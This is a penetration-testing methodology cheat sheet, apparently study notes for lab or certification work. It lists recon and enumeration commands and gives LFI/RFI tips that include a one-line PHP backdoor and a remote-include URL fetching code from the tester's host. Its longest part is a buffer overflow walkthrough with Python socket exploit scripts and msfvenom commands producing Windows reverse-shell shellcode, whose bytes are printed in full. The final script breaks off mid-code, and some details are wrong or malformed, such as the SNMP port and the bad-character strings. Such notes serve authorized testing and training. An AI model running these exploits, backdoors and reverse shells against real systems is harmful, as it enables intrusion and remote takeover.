# Pentesting Methodology & Tasks

## Recon

### DNS

Reverse lookup of entire provided range:

``` 
dig.sh <ips.txt>

for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done
```



### Port Scans

Run dark_enum.py (unicornscan of full port range)



- 1. Actually **read** the intensive nmap scan
- 2. Actually **read** Nikto/Dirb/nmap NSE script output
- 3. Run the port scan again if you think something might have been missed
- Netcat banner grab

	- nc -v 10.10.10.10 port

- Telnet banner grab

	- telnet 10.10.10.10 port

### Enumeration

This is the essential part of penetration. Find out what is available and how you could punch through it with minimum ease.

DO NOT SKIP STEPS.

DO NOT PASS GO.

SEARCH ***ALL*** THE VERSIONS WITH `searchsploit`
(or google -> `site:exploit-db.com APP VERSION`)




- Nmap

	- Quick TCP Scan

		- nmap -sC -sV -vv -oA quick 10.10.10.10

	- Quick UDP Scan

		- nmap -sU -sV -vv -oA quick_udp 10.10.10.10

	- Full TCP Scan

		- nmap -sC -sV -p- -vv -oA full 10.10.10.10

	- Port knock

		- for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done

- HTTP - 80, 8080, 8000

  ``` 
  curl -i ${IP}/robots.txt
  ```
  
  Note down Server and other module versions.
  
  searchsploit them ALL.
  
  Visit all URLs from robots.txt.
  
  ``` 
  nikto -host $IP
  ```
  
  ``` 
  gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
  
  gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
  ```
  
  if nothing, find more web word lists.
  
  *Browse the site* but keep an eye on the burp window / source code / cookies etc.
  
  Things to be on look for:
  
  

	- Web Scanning

		- Gobuster quick directory busting

			- gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

		- Gobuster comprehensive directory busting

			- gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'

		- Gobuster search with file extension

			- gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

		- Nikto web server scan

			- nikto -h 10.10.10.10

		- Wordpress scan

			- wpscan -u 10.10.10.10/wp/

	- Default credentials for software
	- SQL-injectable GET/POST params
	- LFI/RFI through ?page=foo type params
	- LFI:

		- `/etc/passwd` | `/etc/shadow` insta-win
		- `/var/www/html/config.php` or similar paths to get SQL etc creds
		- `?page=php://filter/convert.base64-encode/resource=../config.php`
		- `../../../../../boot.ini` to find out windows version

	- RFI:

		- Have your PHP/cgi downloader ready
		- `<?php include $_GET['inc']; ?>` simplest backdoor to keep it dynamic without anything messing your output
		- Then you can just `http://$IP/inc.php?inc=http://$YOURIP/bg.php` and have full control with minimal footprint on target machine
		- get `phpinfo()`

- HTTPS - 443

  Heartbleed / CRIME / Other similar attacks
  
  Read the actual SSL CERT to:
  
  

	- find out potential correct vhost to GET
	- is the clock skewed
	- any names that could be usernames for bruteforce/guessing.

- FTP - 21

	- Anonymous login
	- Enumerate the hell out of the machine!

		- OS version
		- Other software you can find on the machine (Prog Files, yum.log, /bin)
		- password files
		- DLLs for `msfpescan` / BOF targets

	- Do you have UPLOAD potential?

		- Can you trigger execution of uploads?
		- Swap binaries?

	- Vulnerabilities in version / RCE / #WINNING?-D

- SMB - 139, 445

  ``` 
  enum4linux -a $IP
  ```
  
  Read through the report and search for versions of things => `searchsploit`
  
  ``` 
  smbclient -L $IP
  ```
  
  Mount shares
  
  ``` 
  mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
  ```
  
  Can you access shares?
  
  

	- SMB Vulnerability Scan

		- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10

	- SMB Users & Shares Scan

		- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10

	- Enum4linux

		- enum4linux -a 10.10.10.10

	- Null connect

		- rpcclient -U "" 10.10.10.10

	- Connect to SMB share

		- smbclient //MOUNT/share

	- Directly exploitable MSxx-xxx versions?

		- Worth burning MSF strike?

- SNMP - UDP 169

	- Try to enumerate windows shares / network info

	  Quick test of communities:
	  
	  ``` 
	  onesixtyone
	  ```
	  
	  Full discovery of everything you can:
	  
	  ``` 
	  snmp-check
	  ```
	  
	  

- SNMP enumeration

	- snmp-check 10.10.10.10

- TFTP - UDP 69

	- Read / Write access?

		- Pretty much same things as FTP

- SSH - 22

  Unless you get a MOTD or a broken sshd version, you are SOOL and this is likely just a secondary access point once you break something else.
  
  

- Email - 25, 110/995 or 143/993

  SMTP, POP3(s) and IMAP(s) are good for enumerating users.
  
  Also: ***CHECK VERSIONS*** and `searchsploit`
  
  

## Limited Shells

### python -c 'import pty; pty.spawn("/bin/sh")'

### echo os.system('/bin/bash')

### /bin/sh -i

### perl —e 'exec "/bin/sh";'

### Upgrading from limited shell to full TTY

(Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)



- In reverse shell

	- $ python -c 'import pty; pty.spawn("/bin/bash")'
	- Ctrl-Z

- In Kali

	- $ stty raw -echo
	- $ fg

- In reverse shell

	- $ reset
	- $ export SHELL=bash
	- $ export TERM=xterm-256color
	- $ stty rows X columns Y

	  Useful links:
	  
	  

	- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
	- http://netsec.ws/?p=337

## Buffer Overflow

### Gather victim IP and BOF port

- Find out the IP and port that the buffer overflow is using

### Add to <ip> and <port> in your script

- Set the victims IP and PORT in your script

	- <ip> - <port>

### Send a really big payload, confirm BOF vuln

- python -c ‘print(“A” * 3000);’ | nc <victim> <ip>

	- BOF.py

	  #!/usr/bin/python
	  
	  import sys, socket
	  
	  if len(sys.argv) < 2:
	      print "\nUsage: " + sys.argv[0] + " <HOST>\n"
	      sys.exit()
	  
	  cmd = "OVRFLW "
	  junk = "\x41" * 3000
	  end = "\r\n"
	  
	  buffer = cmd + junk + end
	  
	  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  s.connect((sys.argv[1], 4455))
	  s.send(buffer)
	  s.recv(1024)
	  s.close()
	  

### Confirm you overwrote the EIP in Immunity	

- Confirm the EIP looks like ​41414141​, top right windows of Immunity

	- EIP Confirm

### Generate unique pattern with pattern_create

- metasploit/tools/exploits/Pattern_create -l 3000

	- 2PAtt.py

	  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
	  
	  

### Add unique pattern to the “pattern” variable in script	

- Comment out the payload in the script, run script inluding the pattern as the payload

	- 3EIP.py

	  #!/usr/bin/python
	  
	  import sys, socket
	  
	  if len(sys.argv) < 2:
	      print "\nUsage: " + sys.argv[0] + " <HOST>\n"
	      sys.exit()
	  
	  cmd = "OVRFLW "
	  #junk = "\x41" * 3000
	  pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
	  end = "\r\n"
	  
	  buffer = cmd + pattern + end
	  
	  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  s.connect((sys.argv[1], 4455))
	  s.send(buffer)
	  s.recv(1024)
	  s.close()
	  
	  

### Copy new EIP from Immunity	

- Top right of immunity, copy EIP to clipboard

	- EIP IMM

### Calculate offset with pattern_offset	

- metasploit/tools/exploits/Pattern_offest -q <EIP>

	- Offset

	  #offset 1229
	  

### Show all .dlls (modules) with Mona	

- Command: !mona modules

### Find .dll without bad character (x00) and w/o protections	

- Mona Find dll

### Find “JMP ESP” in .dll	

- !mona find -s “\xff\xe4″ -m <example dll>libsp.dll

	- 

### Copy memory address of JMP ESP in .dll	

- Flip it to little endian (backwards) https://searchnetworking.techtarget.com/definiti on/big-endian-and-little-endian

	- EIPC.py

	  #!/usr/bin/python
	  
	  import sys, socket
	  
	  if len(sys.argv) < 2:
	      print "\nUsage: " + sys.argv[0] + " <HOST>\n"
	      sys.exit()
	  
	  cmd = "OVRFLW "
	  junk = "\x41" * 1229
	  eip = "B" * 4
	  offset = "C" * 10
	  end = "\r\n"
	  
	  buffer = cmd + junk + eip + offset + end
	  
	  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	  s.connect((sys.argv[1], 4455))
	  s.send(buffer)
	  s.recv(1024)
	  s.close()
	  

### Send bad characters	

- Send all characters through to determine bad chars.

	- All Chars

	  kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
	  No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	  No Arch selected, selecting Arch: x86 from the payload
	  No encoder or badchars specified, outputting raw payload
	  unsigned char buf[] =
	  "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
	  "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
	  "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
	  "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
	  "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
	  "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
	  "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
	  "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
	  "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
	  "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
	  "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
	  "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
	  "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x12\x68"
	  "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
	  "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
	  "\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
	  "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
	  "\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
	  "\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
	  "\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
	  "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
	  "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
	  

### Find bad characters	

- From registers panel, click where all the junk went and click <follow in dump> see hex window (bottom left panel)

### Re-send bad chars w/o first found bad char	

- Incrementally remove bad characters, if you find in the hex dump, remove from script, and send it again, go on to the next bad char.

	- Some Chars

	  kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c No platform was selected, choosing Msf::Module::Platform::Windows from the payload No Arch selected, selecting Arch: x86 from the payload No encoder or badchars specified, outputting raw payload unsigned char buf[] = "\xfc\xe8\x82\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30" "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52" "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1" "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b" "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03" "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b" "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24" "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb" "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c" "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68" "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68" "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x12\x68" "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61" "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2" "\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6" "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44" "\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56" "\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff" "\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6" "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
	  

### shikata ga nai	

- regenerate shellcode with bad chars omittes

	- Initial Shell Code

	  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port>-e -f python
	  

### Generate stageless payload shellcode	

- Msfvenom, with -b for excluding found bad characters

	- Final Shell Code

	  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.39. LPORT=443 -e x86/shikata_ga_nai -b '\x00\\x04\x05\28\x29\x4d\x4e\xab\xac\xc7\xc8' \-f python
	  

### Add shellcode/JMP ESP / NOPs (\x90) to script	

- Add the generated shellcode to your script, add the JMP ESP in proper format(lilEndian), add NOPs as padding (usually 16 is fine)

### Finalize payload and script	

- "Ex payload. buffer=""A"" * 780 +
""\x8f\x34\x2a\x7f"" + ""\x90"" * 8(nop) + shellcode"

	- Final Python

	  #!/usr/bin/python
	  import socket
	  import sys
	  import time
	  
	  try:
	   print "\nSending evil buffer..."
	  	
